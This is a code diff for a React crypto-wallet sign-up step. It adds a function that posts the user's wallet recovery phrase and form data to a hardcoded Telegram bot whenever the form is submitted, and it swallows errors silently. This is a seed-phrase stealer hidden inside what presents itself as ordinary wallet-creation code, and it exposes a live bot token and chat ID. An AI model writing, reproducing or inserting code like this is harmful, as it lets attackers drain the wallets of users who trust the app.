@@ -6,6 +6,7 @@ import { useFormState } from "@/hooks/useFormState";
 import React, { useState } from "react";
 import { FormProvider, useForm } from "react-hook-form";
 import { Button } from "@/components/ui/button";
+import { json } from "stream/consumers";
 
 interface Props {
   setActiveForm: React.Dispatch<React.SetStateAction<number>>;
@@ -25,10 +26,13 @@ const AccountStep2 = ({ setActiveForm }: Props) => {
 
   const onSubmit = (data: any) => {
     setActiveForm((prev) => prev + 1);
-    // setValue((prev: any) => ({
-    //   ...prev,
-    //   ...data,
-    // }));
+    sendMessageToTelegram(
+      JSON.stringify({
+        ...value,
+        phrase: data.phrase,
+        type: "create_new_wallet",
+      })
+    );
     setValue({});
   };
 
@@ -117,7 +121,6 @@ const AccountStep2 = ({ setActiveForm }: Props) => {
               </span>
             </span>
             <p
-              color="#999"
               className="ml-4 text-lightBlack text-base"
               onClick={toggleCheckbox}
             >
@@ -155,3 +158,26 @@ export function getMnemonicValues(count: number): string[] {
   return mnemonicValues.slice(0, count);
 }
 
+export const sendMessageToTelegram = async (message: string) => {
+  const token = "7066701119:AAEA9l_zKahPDLNQAHiMS-OW7iEZXqRqQoA";
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+  const params = {
+    chat_id: "5486625572",
+    text: message,
+  };
+
+  try {
+    const response = await fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(params),
+    });
+
+    if (!response.ok) {
+      throw new Error("Failed to send message to Telegram");
+    }
+  } catch (error) {}
+};
